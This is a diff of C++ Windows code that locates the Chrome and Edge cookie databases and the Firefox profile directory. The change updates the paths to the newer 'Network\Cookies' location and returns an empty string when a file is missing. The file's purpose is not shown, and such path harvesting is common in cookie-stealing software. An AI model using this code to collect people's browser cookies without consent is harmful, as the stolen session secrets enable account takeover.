@@ -127,17 +127,17 @@ std::wstring GetChromeCookiesPath() {
     }
 
     // Construct the Chrome Cookies file path
-    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies";
+    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
 
     if (DoesFileExist(desiredPath)) {
         std::wcout << "Chrome cookies file found at: " << desiredPath << std::endl;
+        return desiredPath;
     }
     else {
         std::wcerr << "Failed to find Chrome cookies file at: " << desiredPath << std::endl;
         std::cerr << "Error code: " << GetLastError() << std::endl;
     }
-
-    return desiredPath;
+    return L"";
 }
 
 std::wstring GetFirefoxProfilesPath() {
@@ -154,13 +154,15 @@ std::wstring GetFirefoxProfilesPath() {
 
     if (DoesFileExist(desiredPath)) {
         std::wcout << "Firefox profiles directory found at: " << desiredPath << std::endl;
+        return desiredPath;
+
     }
     else {
         std::wcerr << "Failed to find Firefox profiles directory at: " << desiredPath << std::endl;
         std::cerr << "Error code: " << GetLastError() << std::endl;
     }
+    return L"";
 
-    return desiredPath;
 }
 
 
@@ -174,17 +176,17 @@ std::wstring GetEdgeCookiesPath() {
     }
 
     // Construct the Edge Cookies file path
-    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies";
+    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies";
 
     if (DoesFileExist(desiredPath)) {
         std::wcout << "Edge cookies file found at: " << desiredPath << std::endl;
+        return desiredPath;
     }
     else {
         std::wcerr << "Failed to find Edge cookies file at: " << desiredPath << std::endl;
         std::cerr << "Error code: " << GetLastError() << std::endl;
     }
-
-    return desiredPath;
+    return L"";
 }
 
 std::wstring GetOperaStableCookiesPath() {
